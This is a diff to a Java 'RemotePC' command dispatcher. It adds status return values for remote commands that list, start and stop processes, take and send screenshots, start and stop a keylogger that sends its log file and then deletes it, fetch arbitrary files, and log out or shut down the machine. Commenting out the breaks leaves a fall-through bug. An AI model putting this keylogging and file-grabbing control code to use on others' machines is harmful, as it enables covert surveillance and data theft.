@@ -113,24 +113,37 @@ public class RemotePC {
     }
   }
 
-  public void run() {
+  public String run() {
     ProcessPC process = new ProcessPC();
 
     switch (message[0]) {
       case "process":
         if (message[1].equals("list")) {
           process.listProcess();
-          send.sendFile("process.txt");
-          System.out.println("list process");
+          if (send.sendFile("process.txt"))
+          {
+            System.out.println("list process");
+            return "The process.txt file was sent successfully";
+          }
+          else return "list process failed!";
         }
         if (message[1].equals("start")) {
-          System.out.println("starting process" + message[2]);
-          process.startProcess(message[2]);
+          System.out.println("starting process " + message[2]);
+          if (process.startProcess(message[2]))
+          {
+              return "start process " + message[2] + " successfully";
+          }
+          else return "start process " + message[2] + " failed";
         }
         if (message[1].equals("stop")) {
-          System.out.println("stop process PID" + message[2]);
+          System.out.println("stop process PID " + message[2]);
+          if (process.stopProcess(message[2]))
+          {
+              return "stop process PID " + message[2] + " successfully";
+          }
+          else return "stop process PID " + message[2] + " failed";
         }
-        break;
+        //break;
       case "screenshot":
         System.out.println(message[1]);
         ScreenShot screen = new ScreenShot(message[1]);
@@ -139,15 +152,17 @@ public class RemotePC {
         send.sendFile(message[1]);
         System.out.println("Send  suscessfull");
         deleteFile(message[1]);
-
-        break;
+        return "screenshot: " + message[1] + " was sent successfully";
+        //break;
       case "keylog":
         if (message[1].equals("start")) {
           if (this.keylog.isLoging == false) {
             this.keylog.start();
             System.out.println("start keylog");
+            return "keylog started";
           } else {
-            System.out.println("keylog is running");
+            System.out.println("keylog is already running");
+            return "keylog is already running";
           }
         }
         if (message[1].equals("stop")) {
@@ -157,19 +172,23 @@ public class RemotePC {
             send.sendFile("keylog.txt");
             deleteFile("keylog.txt");
             System.out.println("stop keylog");
+            return "keylog stopped. keylog.txt was sent successfully";
           } else {
             System.out.println("keylog is not running");
+            return "keylog is not running";
           }
         }
-        break;
+        //break;
       case "logout":
         process.logout();
         System.out.println("logout suscessfull");
-        break;
+        return "logout in the next 1 hour";
+        //break;
       case "shutdown":
         process.shutdown();
         System.out.println("shutdown suscessfull");
-        break;
+        return "shutdown in the next 1 hour";
+        //break;
       case "getfile":
         String path = "";
         for (int i = 1; i < message.length; i++) {
@@ -178,10 +197,12 @@ public class RemotePC {
         }
         send.sendFile(path);
         System.out.println("get file suscessfull");
-        break;
+        return "File was sent successfully";
+        //break;
       default:
         System.out.println("command not found");
-        break;
+        return message + " not found";
+        //break;
     }
   }
 }
